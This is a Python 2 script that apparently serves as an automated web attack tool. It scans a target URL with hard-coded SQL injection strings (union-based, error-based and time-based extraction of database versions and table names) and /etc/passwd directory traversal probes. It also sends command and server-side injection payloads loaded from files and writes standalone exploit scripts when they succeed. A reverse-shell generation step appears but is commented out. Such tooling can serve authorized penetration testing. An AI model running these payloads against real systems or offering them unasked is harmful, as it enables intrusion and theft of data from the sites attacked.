import requests
from requests import Request, Session
from pprint import pprint
from urlparse import urlparse
import binascii
import copy
import difflib
import os
import json


CONFIG_SQLI_SLEEP_TIME = 3

SQLI_PROBES = [
	"' OR SLEEP(%d);#" % CONFIG_SQLI_SLEEP_TIME,
	"' OR SLEEP(%d);--" % CONFIG_SQLI_SLEEP_TIME,
	"' OR sleep(%d);#" % CONFIG_SQLI_SLEEP_TIME,
	"' OR sleep(%d);--" % CONFIG_SQLI_SLEEP_TIME,
	"' OR 1=1;#",
	"' OR 1=1;--",
	"' or '1'='1",
	"' or 'a'='a' -- +",
	"' or 'a'='a -- +",
	"' order by 1-- +",
	"' order by 2-- +",
	"' order by 4-- +",
	"' order by 3-- +",
	"' order by 5-- +",
	"' order by 2#",
	"' order by 1#",
	"' order by 3#",
	"' order by 5#",
	"' order by 4#",
	"' ",
	" \" "
]

SQLI_ATTACK = [

	" union all select @@version -- +",
	" union all select 1,@@version,1 -- +",
	" union all select 1,1,@@version,1-- +",
	" union all select 1,1,1,@@version,1-- +",
	" union all select 1,1,1,1,@@version,1-- +",
	" union all select 1,1,1,1,1,@@version,1-- +",
	" union all select 1,1,1,1,1,1,@@version,1-- +",
	"' union all select @@version -- +",
	"' union all select 1,@@version,1 -- +",
	"' union all select 1,1,@@version,1-- +",
	"' union all select 1,1,1,@@version,1-- +",
	"' union all select 1,1,,1,1,@@version,1-- +",
	"' union all select 1,1,1,1,1,@@version,1-- +",
	"' union all select 11,,1,1,1,1,@@version,1-- +",
	"1' AND (select 1 from (select count(*),concat((select version()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -"
	"1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)-- +",
	"\" AND (select 1 from (select count(*),concat((select version()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -"
	"\" AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a)b)-- +",
	"'' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"database1\" LIMIT 0,1)))--",
	"' AND IF ((select ascii(substr(version(),1,1))) > 53,sleep(5),NULL)-- -",
	"' AND IF ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='s',sleep(5),null) --+",
	" union select 1, tbl_name FROM sqlite_master; -- -",
	" union select 1, 2, tbl_name FROM sqlite_master; -- -",
	" union select 1, 2, 3, tbl_name FROM sqlite_master; -- -",
	" union select 1, 2, 3, 4, tbl_name FROM sqlite_master; -- -",
	" union select 1, 2, 3, 4, 5, tbl_name FROM sqlite_master; -- -",
	]

DIR_TRAVERSAL_PROBES = [
	"./" + "../" * 1 + "etc/passwd",
	"./" + "../" * 2 + "etc/passwd",
	"./" + "../" * 3 + "etc/passwd",
	"./" + "../" * 4 + "etc/passwd",
	"./" + "../" * 5 + "etc/passwd",
	"./" + "../" * 6 + "etc/passwd",
	"./" + "../" * 7 + "etc/passwd",
	"./" + "../" * 8 + "etc/passwd",
	"./" + "../" * 9 + "etc/passwd",
	".//" + "..//" * 1 + "etc//passwd",
	".//" + "..//" * 2 + "etc//passwd",
	".//" + "..//" * 3 + "etc//passwd",
	".//" + "..//" * 4 + "etc//passwd",
	".//" + "..//" * 5 + "etc//passwd",
	".//" + "..//" * 6 + "etc//passwd",
	".//" + "..//" * 7 + "etc//passwd",
	".//" + "..//" * 8 + "etc//passwd",
	".//" + "..//" * 9 + "etc//passwd",
]


with open('commandInjPayloads.txt') as f:
 commandExecList = list(f)

with open('serverSidePayloads.txt') as f:
 serverInjectList = list(f)

with open('commandInjExploitPayloads.txt') as f:
 commandExecExploitList = list(f)

with open('commandInjExploitRevShellPayloads.txt') as f:
 commandExecExploitRevShellList = list(f)

with open('serverSideExploitPayloads.txt') as f:
 serverInjectExploitList = list(f)


session = Session()

def scan(url, params):
	print("\n[*] Scanning: %s" % url)
	print("[*] Known Params:")
	pprint(params)

	#Parse endpoints for results file
	parts = urlparse(url)
	hostname = parts.scheme + "://" + parts.netloc
	endpoint = parts.path

	#Results file
	json_results = ""


	#Command Injection
	initial_length = ""
	exploitable = "no"
	for method in params.keys():
		method_params = params[method]

	for key, value in method_params.items():
		response = make_request(method, url, method_params)
		initial_length = response.headers['content-length']
		print "[*]Initial response content length: " + str(response.headers['content-length'])


	#Scan for potential command injection vulns
	for x in commandExecList:
		for key, value in method_params.items():
			method_params[key] = x.replace("\n", "")

			response = make_request(method, url, method_params)
			print "\n[*]Payload used: " + str(method_params)
			print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
			print "[*]Response content length: " + str(response.headers['content-length'])
			print "[*]Response content: \n" + response.content

			delta = int(response.headers['content-length']) - int(initial_length)

			#Search for specific echo string 'gaw4f4sdaf12f', output of passwd or id command.
			if response.content.find("gaw4f4sdaf12f") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1:
				print "[*]Module is potentially vulnerable to command injection!"
				exploitable = "yes"
				with open('results.txt', 'a') as result:
					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')

			#sleep command is 10 seconds
			elif response.elapsed.total_seconds() > 10:
				print "[*]Module is potentially vulnerable to blind command injection!"
				exploitable = "yes"
				with open('results.txt', 'a') as result:
					result.write(json.dumps({ "class":"Command Injection", "results":{ hostname:[ { "endpoint":endpoint, "params": method_params , "method": method }] } }) + '\n')


			#Generate exploitation script for command injection
			count = 0
			exploited = "no"
			if exploitable == "yes":
				for y in commandExecExploitList:
						for key, value in method_params.items():
							if exploited == "no":
								method_params[key] = y.replace("\n", "")
								response = make_request(method, url, method_params)
								print "\n[*]Searching for the correct exploit..."
								print "[*]Payload used: " + str(method_params)
								print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
								print "[*]Response content length: " + str(response.headers['content-length'])
								print "[*]Response content: \n" + response.content

								count=+count+1
								print exploited
								if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
									print "[*]Exploit found!"

									#Generate standalone exploit script to execute uname -a
								 	with open('command_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
					 					if method == "POST":
					 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
					 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
					 						exploitFile.write("print response.content")

					 					elif method == "GET":
					 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
					 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
					 						exploitFile.write("print response.content")
									#exploited = "yes"
									#break





				'''
				#Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
				for z in commandExecExploitRevShellList:
					for key, value in method_params.items():
						method_params[key] = z.replace("\n", "")
						count=+count+1

						print method_params
						#print str(method_params)
					 	with open('command_injection_rev_shell'+str(count)+'.py', 'w') as exploitFile:
		 					if method == "POST":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")

		 					elif method == "GET":
		 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
		 						exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
		 						exploitFile.write("print response.content")

					 	exploitable = "no" # reset to orignal state
						'''


	#Server Side Injection
	initial_length = ""
	exploitable = "no"
	for method in params.keys():
		method_params = params[method]

	for key, value in method_params.items():
		response = make_request(method, url, method_params)
		initial_length = response.headers['content-length']
		print "[*]Initial response content length: " + str(response.headers['content-length'])

	#Scan for potential vulns
	for x in serverInjectList:
		for key, value in method_params.items():
			method_params[key] = x.replace("\n", "")

		response = make_request(method, url, method_params)
	 	print "\n[*]Payload used: " + str(method_params)
	 	print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
	 	print "[*]Response content length: " + str(response.headers['content-length'])
		print "[*]Response content: \n" + response.content

		delta = int(response.headers['content-length']) - int(initial_length)

		#Searches for specific echo string, or output of passwd
		if response.content.find("vq3rio13dj8x") != -1 or response.content.find("/bin") != -1:
			print "[*]Module potentially vulnerable to sever side injection!"
			exploitable = "yes"
			with open('results.txt', 'a') as result:
				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
			#break

		elif response.elapsed.total_seconds() > 12:
			print "[*]Vulnerable to blind sever side injection"
			exploitable = "yes"
			with open('results.txt', 'a') as result:
				result.write(json.dumps({ "class":"Server Side Code Injection", "results":{ hostname:[ { "endpoint":endpoint, "params":method_params, "method": method }] }}) + '\n')
			#break

		#Generate exploitable script for server side injection
		count = 0
		exploited = "no"
		if exploitable == "yes":
			for y in serverInjectExploitList:
				for key, value in method_params.items():
					if exploited == "no":
						method_params[key] = y.replace("\n", "")
						response = make_request(method, url, method_params)
						print "\n[*]Searching for the correct exploit..."
						print "[*]Payload used: " + str(method_params)
						print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
						print "[*]Response content length: " + str(response.headers['content-length'])
						print "[*]Response content: \n" + response.content


						count=+count+1

						if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
							print "[*]Exploit found!"
							with open('server_side_injection'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
								if method == "POST":
									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
									exploitFile.write('response = requests.post("'+url+'",'+str(method_params)+')\n')
									exploitFile.write("print response.content")
								elif method == "GET":
									exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
									exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
									exploitFile.write("print response.content")
							exploited = "yes"
							break


'''

	# Check for open redirects
	# ========================
	# 1. Parameter value is contained in redirected URL
	print("[*] Testing for open redirects")
	for method in params.keys():
		method_params = params[method]
		response = make_request(method, url, method_params)
		for history_response in response.history:
			if 300 <= history_response.status_code < 400:
				print("[!] Request history contains redirect: %s (%d)" % (history_response.url, history_response.status_code))
		for param, value in method_params.items():
			parsed_url = urlparse(response.url)
			if parsed_url.path.endswith(str(value)):
				print("[!] Redirected URL path ends with parameter value (%s=%s)" % (param, value))

	# Check for unsanitized inputs
	# ============================
	# 1. Using a few random values and checking if response changes
	#    We are looking for whether first delta changes (i.e. original input is a valid input)
	print("[*] Testing for unsanitized inputs")
	for method in params.keys():
		method_params = params[method]
		response = make_request(method, url, method_params)
		prev_html = response.content
		first_delta = False
		for i in range(3):
			params_copy = copy.deepcopy(method_params)
			for key in params_copy.keys():
				params_copy[key] = binascii.hexlify(os.urandom(20))
			request = Request(method, url, params=params_copy)
			prepared_request = session.prepare_request(request)
			response = session.send(prepared_request)
			delta = difflib.context_diff(prev_html, response.content)
			print("[*] Listing page HTML delta")
			count = 0
			for line in delta:
				# print(line)
				count += 1
			if i == 0 and count > 0:
				first_delta = True
			print("[*] Delta lines: %d" % count)
			prev_html = response.content

		if first_delta:
			print("[*] Non-zero first delta, trying directory traversal probes")
			for param in method_params.keys():
				params_copy = copy.deepcopy(method_params)
				for probe in DIR_TRAVERSAL_PROBES:
					params_copy[param] = probe
					response = make_request(method, url, params_copy)
					if "root:x:0:0" in response.content:
						print("[!] Found directory traversal indication using parameter value (%s=%s)" % (param, probe))
						break

		print("[*] Trying SQLi probes")
		for param in method_params.keys():
			params_copy = copy.deepcopy(method_params)
			for probe in SQLI_PROBES:
				params_copy[param] = probe
				response = make_request(method, url, params_copy)
				print response.content
				delta_lines = sum(1 for _ in difflib.context_diff(prev_html, response.content))
				if "SLEEP" in probe or "sleep" in probe:
					if response.elapsed.total_seconds() > CONFIG_SQLI_SLEEP_TIME:
						print("[!] Highly possible SQLi, probe triggered server sleep using parameter value (%s=%s)" % (param, probe))
						break
				if delta_lines > 5:
					print("[!] Possible SQLi, probe triggered large response delta using parameter value (%s=%s)" % (param, probe))
					break


'''

def make_request(method, url, params):
	if method == 'POST':
		return session.post(url, data=params)
	elif method == 'GET':
		return session.get(url, params=params)

	else:
		raise ValueError("Unknown method %s" % method)

if __name__ == '__main__':
	#scan('http://target.com/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
	#scan('http://target.com/sqli/sqli.php', {'POST': {'username': None}})
	#scan('http://target.com/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})
	scan('http://target.com/commandinjection/commandinjection.php', {'POST': {'host': '8.8.8.8'}})
	#scan('http://target.com/serverside/serverside.php', {'GET': {'language': 'apples'}})
